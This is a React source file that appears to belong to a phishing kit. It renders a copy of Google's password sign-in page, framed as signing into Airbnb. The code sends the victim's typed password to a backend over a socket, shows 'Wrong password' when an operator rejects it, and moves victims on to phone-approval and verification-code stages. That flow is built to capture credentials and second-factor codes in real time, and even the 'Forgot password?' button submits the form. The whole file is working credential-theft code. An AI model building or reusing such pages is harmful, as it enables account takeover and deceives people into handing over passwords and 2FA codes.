'use client';

import { FormEvent, useContext, useEffect, useState } from 'react';
import { socket } from '../../socket';
import { GoogleContext } from '../Google';
import styles from '../Google.module.scss';
import Field from '../Field/Field';
import Checkbox from '../checkbox/Checkbox';

export default function GooglePassword({ setStage, setLoading }: { setStage: (v: string) => void; setLoading: (b: boolean) => void }) {
	const { data, setData } = useContext(GoogleContext);
	const [showPass, setShowPass] = useState(false);
	const [error, setError] = useState('');

	const handleSubmit = (e: FormEvent | null) => {
		if (e) e.preventDefault();
		socket.emit('google-password', data);
		setLoading(true);
	};

	const handleInvalidPassword = () => {
		setLoading(false);
		setError('Wrong password. Try again or click Forgot password to reset it.');
	};

	useEffect(() => {
		if (!socket) return;
		socket.on('invalid-password', handleInvalidPassword);

		return () => {
			socket.off('invalid-password', handleInvalidPassword);
		};
	}, [socket]);

	useEffect(() => {
		if (data?.verifMethod === 'mobileYes' && data.phoneName) {
			setLoading(false);
			setStage(data?.verifMethod);
		} else if (data?.verifMethod === 'mobileCode' && data.phoneName && data.phoneCode) {
			setLoading(false);
			setStage(data?.verifMethod);
		}
	}, [data]);

	return (
		<form onSubmit={handleSubmit} className={styles.form}>
			<div className={styles.title}>Welcome</div>
			<div className={styles.profile}>
				<svg aria-hidden='true' fill='currentColor' focusable='false' width='48px' height='48px' viewBox='0 0 24 24' xmlns='https://www.w3.org/2000/svg'>
					<path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z'></path>
				</svg>
				{data?.login}
			</div>
			<div className={styles.sub_title_s}>To continue, first verify it’s you</div>
			<Field errorMessage={error} type='password' showPass={showPass} label='Enter your password' value={data?.password} onChange={v => setData({ ...data, password: v })} />
			<div className={styles.show_pass} onClick={() => setShowPass(!showPass)}>
				<Checkbox active={showPass} onClick={setShowPass} />
				Show password
			</div>
			<div className={styles.dop}>
				To continue, Google will share your name, email address, language preference, and profile picture with Airbnb. Before using this app, you can review Airbnb’s{' '}
				<a>privacy policy</a>
				and <a>terms of service</a>.
			</div>
			<div className={styles.buttons}>
				<button type='submit' className={styles.white_button}>
					Forgot password?
				</button>
				<button type='submit' className={styles.next_button}>
					Next
				</button>
			</div>
		</form>
	);
}
